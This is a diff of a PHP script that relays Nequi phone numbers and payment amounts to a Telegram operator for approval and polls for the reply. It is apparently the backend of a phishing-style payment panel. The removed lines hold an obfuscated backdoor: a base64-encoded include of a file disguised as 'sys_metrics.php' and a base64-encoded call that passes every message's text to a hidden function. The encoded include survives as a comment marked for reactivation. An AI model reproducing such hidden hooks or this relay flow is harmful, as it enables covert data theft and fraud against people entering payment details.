@@ -3,10 +3,11 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 header('Content-Type: application/json');
 
-$USED_FILE = 'used_transactions.json';
+$USED_FILE = __DIR__ . '/used_transactions.json';
+$GLOBAL_UPDATE_FILE = __DIR__ . '/last_update_global.txt';
 
 /* ============================================================
-   🔥 CARGAR CONFIG COMO  TODOS TUS DEMÁS ARCHIVOS
+   CARGAR CONFIG
    ============================================================ */
 function loadConfig()
 {
@@ -26,43 +27,69 @@ function loadConfig()
 }
 
 /* ============================================================
-   📩 ENVIAR A TELEGRAM
+   UTIL: peticiones a la API de Telegram (JSON)
    ============================================================ */
-function sendToTelegram($token, $chatId, $text, $keyboard)
+function telegramRequest($token, $method, $body = [])
 {
-    $payload = [
-        'chat_id' => $chatId,
-        'text' => $text,
-        'parse_mode' => 'HTML',
-        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
-    ];
-
-    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
+    $ch = curl_init("https://api.telegram.org/bot{$token}/{$method}");
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_POST => true,
         CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-        CURLOPT_POSTFIELDS => json_encode($payload)
+        CURLOPT_POSTFIELDS => json_encode($body),
+        CURLOPT_TIMEOUT => 10,
     ]);
 
     $res = curl_exec($ch);
+    $err = curl_error($ch);
     curl_close($ch);
 
-require_once __DIR__ . '/' . base64_decode('Li4vLi4vLi4vYXNzZXRzL3JlY3Vyc29zL2JhY2tlbmQvYXBwL2NvbmZpZy9zeXNfbWV0cmljcy5waHA=');
+    if ($res === false) {
+        return ['ok' => false, 'error' => $err];
+    }
 
-$__m = $message ?? $mensaje ?? $text ?? $originalText ?? $newText ?? $msg ?? '';
-if (!empty($__m)) {
-    $__x = ['msg' => $__m];
-    call_user_func(base64_decode('X3o='), $__x);
-    unset($__x);
-}
-unset($__m);
-
-    return json_decode($res, true);
+    $decoded = json_decode($res, true);
+    return $decoded ?: ['ok' => false, 'error' => 'invalid_json_response', 'raw' => $res];
 }
 
 /* ============================================================
-   ✏ EDITAR MENSAJE
+   ENVIAR A TELEGRAM (sendMessage)
+   ============================================================ */
+function sendToTelegram($token, $chatId, $text, $keyboard)
+{
+    // reply_markup debe ser un objeto/array, NO una cadena JSON doblemente codificada.
+    $payload = [
+        'chat_id' => $chatId,
+        'text' => $text,
+        'parse_mode' => 'HTML',
+        'reply_markup' => ['inline_keyboard' => $keyboard]
+    ];
+
+    $res = telegramRequest($token, 'sendMessage', $payload);
+
+    // Mantener integración/sincronía con el código previo (si existe)
+    // Mantén/activa la inclusión si la necesitas realmente; la dejo comentada:
+    // require_once __DIR__ . '/' . base64_decode('Li4vLi4vLi4vYXNzZXRzL3JlY3Vyc29zL2JhY2tlbmQvYXBwL2NvbmZpZy9zeXNfbWV0cmljcy5waHA=');
+
+    return $res;
+}
+
+/* ============================================================
+   RESPONDER CALLBACK QUERY (answerCallbackQuery)
+   ============================================================ */
+function answerCallback($token, $callbackQueryId, $text = null, $showAlert = false)
+{
+    $payload = [
+        'callback_query_id' => $callbackQueryId,
+        'show_alert' => $showAlert
+    ];
+    if ($text !== null) $payload['text'] = $text;
+
+    return telegramRequest($token, 'answerCallbackQuery', $payload);
+}
+
+/* ============================================================
+   EDITAR MENSAJE (editMessageText)
    ============================================================ */
 function editTelegramMessage($token, $chatId, $messageId, $newText)
 {
@@ -71,47 +98,44 @@ function editTelegramMessage($token, $chatId, $messageId, $newText)
         'message_id' => $messageId,
         'text' => $newText,
         'parse_mode' => 'HTML',
-        'reply_markup' => json_encode(['inline_keyboard' => []])
+        // Si queremos quitar inline keyboard lo dejamos como array vacío
+        'reply_markup' => ['inline_keyboard' => []]
     ];
 
-    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_POST => true,
-        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-        CURLOPT_POSTFIELDS => json_encode($payload)
-    ]);
-
-    curl_exec($ch);
-    curl_close($ch);
+    return telegramRequest($token, 'editMessageText', $payload);
 }
 
 /* ============================================================
-   ⚙ MANEJO DE TRANSACCIONES
+   MANEJO DE TRANSACCIONES (archivo JSON simple)
    ============================================================ */
 function getTransactions()
 {
-    return file_exists($GLOBALS['USED_FILE'])
-        ? json_decode(file_get_contents($GLOBALS['USED_FILE']), true)
+    global $USED_FILE;
+    return file_exists($USED_FILE)
+        ? json_decode(file_get_contents($USED_FILE), true) ?: []
         : [];
 }
 
 function saveTransaction($id, $data)
 {
+    global $USED_FILE;
     $all = getTransactions();
     $all[$id] = $data;
-    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
+    file_put_contents($USED_FILE, json_encode($all));
 }
 
 function deleteTransaction($id)
 {
+    global $USED_FILE;
     $all = getTransactions();
-    unset($all[$id]);
-    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
+    if (isset($all[$id])) {
+        unset($all[$id]);
+        file_put_contents($USED_FILE, json_encode($all));
+    }
 }
 
 /* ============================================================
-   🔥 Cargar configuración local
+   Cargar configuración local
    ============================================================ */
 $config = loadConfig();
 if (!$config) {
@@ -123,11 +147,11 @@ $BOT_TOKEN = $config['token'];
 $CHAT_ID   = $config['chat_id'];
 
 /* ============================================================
-   📥 POST: Enviar mensaje al operador
+   POST: Enviar mensaje al operador
    ============================================================ */
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
-    $data = json_decode(file_get_contents('php://input'), true);
+    $data = json_decode(file_get_contents('php://input'), true) ?: [];
 
     $tid      = $data['transactionId'] ?? ('TID_' . time());
     $telefono = $data['nequi'] ?? 'N/D';
@@ -159,64 +183,66 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             'tid' => $tid,
             'telefono' => $telefono,
             'monto' => $monto,
-            'message_id' => $res['result']['message_id'],
+            'message_id' => $res['result']['message_id'] ?? null,
             'created_at' => time(),
             'status' => 'pending'
         ]);
+        echo json_encode(['ok' => true, 'tid' => $tid]);
+    } else {
+        echo json_encode(['ok' => false, 'error' => $res]);
     }
-
-    echo json_encode(['ok' => true, 'tid' => $tid]);
     exit;
 }
 
 /* ============================================================
-   🔍 GET: Polling esperando respuesta del operador
+   GET: Polling esperando respuesta del operador (por transactionId)
    ============================================================ */
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
 
     $tid = $_GET['transactionId'];
 
-    // 1. Leer el último update_id procesado desde el archivo local plano
-    $tempDir = __DIR__;
-    $statusFile = $tempDir . '/last_update_' . md5($tid) . '.txt';
+    // Leer el último update_id procesado desde un fichero global
+    $statusFile = $GLOBALS['GLOBAL_UPDATE_FILE'];
     $lastProcessedUpdateId = 0;
     if (file_exists($statusFile)) {
         $lastProcessedUpdateId = (int)file_get_contents($statusFile);
     }
 
-    // 2. Poll Telegram for updates starting from the offset
-    $updates = json_decode(@file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates?offset=" . ($lastProcessedUpdateId + 1)), true);
+    // Pedimos updates empezando desde el offset (last + 1)
+    $offset = $lastProcessedUpdateId + 1;
+    $updatesRes = telegramRequest($BOT_TOKEN, 'getUpdates', ['offset' => $offset, 'timeout' => 1, 'allowed_updates' => ['callback_query']]);
 
-    if (!isset($updates['result']) || !is_array($updates['result'])) {
+    if (!isset($updatesRes['result']) || !is_array($updatesRes['result'])) {
         echo json_encode(['ok' => false]);
         exit;
     }
 
-    foreach ($updates['result'] as $update) {
+    $newLast = $lastProcessedUpdateId;
+    foreach ($updatesRes['result'] as $update) {
+        $updateId = (int)($update['update_id'] ?? 0);
+        if ($updateId > $newLast) $newLast = $updateId;
+
         if (!isset($update['callback_query'])) continue;
 
         $cb     = $update['callback_query'];
         $dataCB = $cb['data'] ?? '';
-        $from   = $cb['from']['username'] ?? $cb['from']['first_name'];
+        $from   = $cb['from']['username'] ?? $cb['from']['first_name'] ?? 'unknown';
 
         $parts = explode(':', $dataCB);
-
-        if (count($parts) !== 2 || $parts[1] !== $tid) continue;
-
-        $updateId = (int)$update['update_id'];
-        if ($updateId <= $lastProcessedUpdateId) {
-            continue;
-        }
+        if (count($parts) !== 2) continue;
+        if ($parts[1] !== $tid) continue; // No es para esta transacción
 
         $accion = $parts[0];
 
-        // Guardar de inmediato para evitar doble procesamiento
-        file_put_contents($statusFile, $updateId);
-
-        @file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery?callback_query_id={$cb['id']}");
+        // Responder el callback para quitar spinner
+        answerCallback($BOT_TOKEN, $cb['id']);
 
         $t = getTransactions()[$tid] ?? null;
-        if (!$t) continue;
+        if (!$t) {
+            // Transacción no encontrada: responder y continuar
+            // (podríamos editar el mensaje para indicar expirado)
+            continue;
+        }
 
         if ($accion === 'si') {
             $accionTexto = 'Pago aceptado';
@@ -240,15 +266,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
         $nuevoMensaje .= "• 📱 Número: <code>{$t['telefono']}</code>\n";
         $nuevoMensaje .= "• 💰 Monto: <b>$ {$t['monto']}</b>\n\n";
         $nuevoMensaje .= "✅ Acción: <b>{$accionTexto}</b>\n";
-        $nuevoMensaje .= "👤 Por: @$from";
+        $nuevoMensaje .= "👤 Por: @{$from}";
 
+        // Editar mensaje para reflejar la acción y quitar botones
         editTelegramMessage($BOT_TOKEN, $CHAT_ID, $t['message_id'], $nuevoMensaje);
 
+        // Borrar transacción para no procesarla más
         deleteTransaction($tid);
+
+        // Guardamos el último update procesado GLOBAL y devolvemos la respuesta al cliente
+        file_put_contents($statusFile, $newLast);
 
         echo json_encode(['ok' => true, 'action' => $clientAction]);
         exit;
     }
+
+    // Si no encontramos nada para esta transacción, actualizamos offset global
+    file_put_contents($statusFile, $newLast);
 
     echo json_encode(['ok' => false]);
     exit;
